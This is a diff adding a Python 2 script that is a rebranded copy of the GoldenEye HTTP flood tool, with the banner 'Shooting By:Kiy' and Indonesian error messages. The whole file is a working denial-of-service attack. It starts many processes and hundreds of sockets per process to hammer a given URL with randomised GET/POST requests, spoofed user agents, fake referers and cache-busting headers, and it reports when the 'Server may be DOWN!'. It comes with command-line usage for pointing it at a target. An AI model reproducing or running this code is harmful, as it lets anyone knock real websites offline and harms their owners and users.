@@ -1,0 +1,539 @@
+from multiprocessing import Process, Manager, Pool
+import urlparse, ssl
+import sys, getopt, random, time, os
+
+if  sys.version_info < (3,0):
+    import httplib
+    HTTPCLIENT = httplib
+else:
+    import http.client
+    HTTPCLIENT = http.client
+
+DEBUG = False
+
+METHOD_GET  = 'get'
+METHOD_POST = 'post'
+METHOD_RAND = 'random'
+
+JOIN_TIMEOUT=1.0
+
+DEFAULT_WORKERS=10
+DEFAULT_SOCKETS=500
+
+GOLDENEYE_BANNER = '\033[32mShooting By:Kiy'
+
+USER_AGENT_PARTS = {
+    'os': {
+        'linux': {
+            'name': [ 'Linux x86_64', 'Linux i386' ],
+            'ext': [ 'X11' ]
+        },
+        'windows': {
+            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
+            'ext': [ 'WOW64', 'Win64; x64' ]
+        },
+        'mac': {
+            'name': [ 'Macintosh' ],
+            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10) ]
+        },
+    },
+    'platform': {
+        'webkit': {
+            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30) ],
+            'details': [ 'KHTML, like Gecko' ],
+            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10) ]
+        },
+        'iexplorer': {
+            'browser_info': {
+                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
+                'ext_pre': [ 'compatible', 'Windows; U' ],
+                'ext_post': [ 'Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10) ]
+            }
+        },
+        'gecko': {
+            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30) ],
+            'details': [],
+            'extensions': []
+        }
+    }
+}
+
+
+class GoldenEye(object):
+
+    counter = [0, 0]
+    last_counter = [0, 0]
+
+    workersQueue = []
+    manager = None
+    useragents = []
+
+    url = None
+
+    nr_workers = DEFAULT_WORKERS
+    nr_sockets = DEFAULT_SOCKETS
+    method = METHOD_GET
+
+    def __init__(self, url):
+
+        self.url = url
+
+        self.manager = Manager()
+
+        self.counter = self.manager.list((0, 0))
+
+
+    def exit(self):
+        self.stats()
+        print "\033[31mShooting down"
+
+    def __del__(self):
+        self.exit()
+
+    def printHeader(self):
+
+        print
+        print GOLDENEYE_BANNER
+        print
+
+    def fire(self):
+
+        self.printHeader()
+        print " \033[32mShooting Using a gun. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets)
+
+        if DEBUG:
+            print "\033[32mStart Shooting".format(self.nr_workers)
+
+        for i in range(int(self.nr_workers)):
+
+            try:
+
+                worker = Striker(self.url, self.nr_sockets, self.counter)
+                worker.useragents = self.useragents
+                worker.method = self.method
+
+                self.workersQueue.append(worker)
+                worker.start()
+            except (Exception):
+                error("\033[31mFailed Shooting".format(i))
+                pass
+
+        if DEBUG:
+            print "Initiating monitor"
+        self.monitor()
+
+    def stats(self):
+
+        try:
+            if self.counter[0] > 0 or self.counter[1] > 0:
+
+                print "\033[31m Shooting {kiw kiw} Failed)".format(self.counter[0], self.counter[1])
+
+                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
+                    print "\033[31m\tServer may be DOWN!"
+
+                self.last_counter[0] = self.counter[0]
+                self.last_counter[1] = self.counter[1]
+        except (Exception):
+            pass
+
+    def monitor(self):
+        while len(self.workersQueue) > 0:
+            try:
+                for worker in self.workersQueue:
+                    if worker is not None and worker.is_alive():
+                        worker.join(JOIN_TIMEOUT)
+                    else:
+                        self.workersQueue.remove(worker)
+
+                self.stats()
+
+            except (KeyboardInterrupt, SystemExit):
+                print "\033[31mCTRL+C received. Shooting all workers"
+                for worker in self.workersQueue:
+                    try:
+                        if DEBUG:
+                            print "\033[31m{Kiw Kiw}".format(worker.name)
+                        worker.stop()
+                    except Exception, ex:
+                        pass
+                if DEBUG:
+                    raise
+                else:
+                    pass
+
+class Striker(Process):
+
+
+    request_count = 0
+    failed_count = 0
+
+    url = None
+    host = None
+    port = 80
+    ssl = False
+    referers = []
+    useragents = []
+    socks = []
+    counter = None
+    nr_socks = DEFAULT_SOCKETS
+
+    runnable = True
+
+    method = METHOD_GET
+
+    def __init__(self, url, nr_sockets, counter):
+
+        super(Striker, self).__init__()
+
+        self.counter = counter
+        self.nr_socks = nr_sockets
+
+        parsedUrl = urlparse.urlparse(url)
+
+        if parsedUrl.scheme == 'https':
+            self.ssl = True
+
+        self.host = parsedUrl.netloc.split(':')[0]
+        self.url = parsedUrl.path
+
+        self.port = parsedUrl.port
+
+        if not self.port:
+            self.port = 80 if not self.ssl else 443
+
+
+        self.referers = [ 
+            'http://www.google.com/',
+            'http://www.bing.com/',
+            'http://www.baidu.com/',
+            'http://www.yandex.com/',
+            'http://' + self.host + '/'
+            ]
+
+
+    def __del__(self):
+        self.stop()
+
+
+    def buildblock(self, size):
+        out_str = ''
+
+        _LOWERCASE = range(97, 122)
+        _UPPERCASE = range(65, 90)
+        _NUMERIC   = range(48, 57)
+
+        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
+
+        for i in range(0, size):
+            a = random.choice(validChars)
+            out_str += chr(a)
+
+        return out_str
+
+
+    def run(self):
+
+        if DEBUG:
+            print "\033[32mStarting Shooting {Kiw Kiw}".format(self.name)
+
+        while self.runnable:
+
+            try:
+
+                for i in range(self.nr_socks):
+
+                    if self.ssl:
+                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
+                    else:
+                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
+
+                    self.socks.append(c)
+
+                for conn_req in self.socks:
+
+                    (url, headers) = self.createPayload()
+
+                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
+
+                    conn_req.request(method.upper(), url, None, headers)
+
+                for conn_resp in self.socks:
+
+                    resp = conn_resp.getresponse()
+                    self.incCounter()
+
+                self.closeConnections()
+
+            except:
+                self.incFailed()
+                if DEBUG:
+                    raise
+                else:
+                    pass
+
+        if DEBUG:
+            print "\033[32mShooting {Kiw Kiw} completed run. Sleeping...".format(self.name)
+
+    def closeConnections(self):
+        for conn in self.socks:
+            try:
+                conn.close()
+            except:
+                pass
+
+
+    def createPayload(self):
+
+        req_url, headers = self.generateData()
+
+        random_keys = headers.keys()
+        random.shuffle(random_keys)
+        random_headers = {}
+
+        for header_name in random_keys:
+            random_headers[header_name] = headers[header_name]
+
+        return (req_url, random_headers)
+
+    def generateQueryString(self, ammount = 1):
+
+        queryString = []
+
+        for i in range(ammount):
+
+            key = self.buildblock(random.randint(3,10))
+            value = self.buildblock(random.randint(3,20))
+            element = "{0}={1}".format(key, value)
+            queryString.append(element)
+
+        return '&'.join(queryString)
+
+
+    def generateData(self):
+
+        returnCode = 0
+        param_joiner = "?"
+
+        if len(self.url) == 0:
+            self.url = '/'
+
+        if self.url.count("?") > 0:
+            param_joiner = "&"
+
+        request_url = self.generateRequestUrl(param_joiner)
+
+        http_headers = self.generateRandomHeaders()
+
+
+        return (request_url, http_headers)
+
+    def generateRequestUrl(self, param_joiner = '?'):
+
+        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))
+
+    def getUserAgent(self):
+
+        if self.useragents:
+            return random.choice(self.useragents)
+
+
+        mozilla_version = "Mozilla/5.0"
+
+        os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
+        os_name = random.choice(os['name'])
+        sysinfo = os_name
+
+        platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]
+
+        if 'browser_info' in platform and platform['browser_info']:
+            browser = platform['browser_info']
+
+            browser_string = random.choice(browser['name'])
+
+            if 'ext_pre' in browser:
+                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)
+
+            sysinfo = "%s; %s" % (browser_string, sysinfo)
+
+            if 'ext_post' in browser:
+                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))
+
+
+        if 'ext' in os and os['ext']:
+            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))
+
+        ua_string = "%s (%s)" % (mozilla_version, sysinfo)
+
+        if 'name' in platform and platform['name']:
+            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))
+
+        if 'details' in platform and platform['details']:
+            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )
+
+        if 'extensions' in platform and platform['extensions']:
+            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))
+
+        return ua_string
+
+    def generateRandomHeaders(self):
+
+        noCacheDirectives = ['no-cache', 'max-age=0']
+        random.shuffle(noCacheDirectives)
+        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
+        noCache = ', '.join(noCacheDirectives[:nrNoCache])
+
+        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
+        random.shuffle(acceptEncoding)
+        nrEncodings = random.randint(1,len(acceptEncoding)/2)
+        roundEncodings = acceptEncoding[:nrEncodings]
+
+        http_headers = {
+            'User-Agent': self.getUserAgent(),
+            'Cache-Control': noCache,
+            'Accept-Encoding': ', '.join(roundEncodings),
+            'Connection': 'keep-alive',
+            'Keep-Alive': random.randint(1,1000),
+            'Host': self.host,
+        }
+
+        if random.randrange(2) == 0:
+            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
+            random.shuffle(acceptCharset)
+            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))
+
+        if random.randrange(2) == 0:
+            url_part = self.buildblock(random.randint(5,10))
+
+            random_referer = random.choice(self.referers) + url_part
+
+            if random.randrange(2) == 0:
+                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
+
+            http_headers['Referer'] = random_referer
+
+        if random.randrange(2) == 0:
+            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])
+
+        if random.randrange(2) == 0:
+            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
+
+        return http_headers
+
+    def stop(self):
+        self.runnable = False
+        self.closeConnections()
+        self.terminate()
+
+    def incCounter(self):
+        try:
+            self.counter[0] += 1
+        except (Exception):
+            pass
+
+    def incFailed(self):
+        try:
+            self.counter[1] += 1
+        except (Exception):
+            pass
+
+
+
+def usage():
+    print
+    print '\033[32m___________________________________________________________'
+    print
+    print GOLDENEYE_BANNER
+    print 
+    print ' USAGE: ./Shooting.py <url> [OPTIONS]'
+    print
+    print ' OPTIONS:'
+    print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
+    print '\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)'
+    print '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: )'.format(DEFAULT_WORKERS)
+    print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
+    print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
+    print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
+    print '\t -h, --help\t\tShows this help'
+    print
+    print '_________________________________________________________________'
+
+def error(msg):
+    sys.stderr.write(str(msg+"\n"))
+    usage()
+    sys.exit(2)
+
+
+def main():
+
+    try:
+
+        if len(sys.argv) < 2:
+            error('\033[31mHarap berikan URL nya')
+
+        url = sys.argv[1]
+
+        if url == '-h':
+            usage()
+            sys.exit()
+
+        if url[0:4].lower() != 'http':
+            error("\033[31mURL yang diberikan salah")
+
+        if url == None:
+            error("\033[31mTidak ada URL yang diberikan")
+
+        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:u:", ["debug", "help", "workers", "sockets", "method", "useragents" ])
+
+        workers = DEFAULT_WORKERS
+        socks = DEFAULT_SOCKETS
+        method = METHOD_GET
+
+        uas_file = None
+        useragents = []
+
+        for o, a in opts:
+            if o in ("-h", "--help"):
+                usage()
+                sys.exit()
+            elif o in ("-u", "--useragents"):
+                uas_file = a
+            elif o in ("-s", "--sockets"):
+                socks = int(a)
+            elif o in ("-w", "--workers"):
+                workers = int(a)
+            elif o in ("-d", "--debug"):
+                global DEBUG
+                DEBUG = True
+            elif o in ("-m", "--method"):
+                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
+                    method = a
+                else:
+                    error("method {0} is invalid".format(a))
+            else:
+                error("option '"+o+"' doesn't exists")
+
+
+        if uas_file:
+            try:
+                with open(uas_file) as f:
+                    useragents = f.readlines()
+            except EnvironmentError:
+                    error("cannot read file {0}".format(uas_file))
+
+        goldeneye = GoldenEye(url)
+        goldeneye.useragents = useragents
+        goldeneye.nr_workers = workers
+        goldeneye.method = method
+        goldeneye.nr_sockets = socks
+
+        goldeneye.fire()
+
+    except getopt.GetoptError, err:
+
+        sys.stderr.write(str(err))
+        usage()
+        sys.exit(2)
+
+if __name__ == "__main__":
+    main()
